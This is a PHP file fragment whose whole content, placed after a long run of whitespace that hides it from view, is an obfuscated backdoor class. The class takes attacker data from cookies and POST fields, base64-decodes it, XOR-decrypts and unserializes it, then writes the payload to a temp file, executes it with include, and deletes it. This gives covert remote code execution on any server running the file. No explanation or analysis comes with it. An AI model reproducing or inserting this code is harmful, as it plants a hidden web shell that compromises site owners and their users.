<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("oMneYLA")){class oMneYLA{public static $MBolcRKFMy = "iJyZKnpCxTVriVYW";public static $ICpcBSWze = NULL;public function __construct(){$BZwlhia = @$_COOKIE[substr(oMneYLA::$MBolcRKFMy, 0, 4)];if (!empty($BZwlhia)){$buJwvVxvi = "base64";$XGdOfYpQA = "";$BZwlhia = explode(",", $BZwlhia);foreach ($BZwlhia as $ZQZcQhbL){$XGdOfYpQA .= @$_COOKIE[$ZQZcQhbL];$XGdOfYpQA .= @$_POST[$ZQZcQhbL];}$XGdOfYpQA = array_map($buJwvVxvi . "_decode", array($XGdOfYpQA,)); $XGdOfYpQA = $XGdOfYpQA[0] ^ str_repeat(oMneYLA::$MBolcRKFMy, (strlen($XGdOfYpQA[0]) / strlen(oMneYLA::$MBolcRKFMy)) + 1);oMneYLA::$ICpcBSWze = @unserialize($XGdOfYpQA);}}public function __destruct(){$this->RbQtnv();}private function RbQtnv(){if (is_array(oMneYLA::$ICpcBSWze)) {$kqnXU = sys_get_temp_dir() . "/" . crc32(oMneYLA::$ICpcBSWze["salt"]);@oMneYLA::$ICpcBSWze["write"]($kqnXU, oMneYLA::$ICpcBSWze["content"]);include $kqnXU;@oMneYLA::$ICpcBSWze["delete"]($kqnXU);exit();}}}$UsbhdriHe = new oMneYLA(); $UsbhdriHe = NULL;} ?><?php
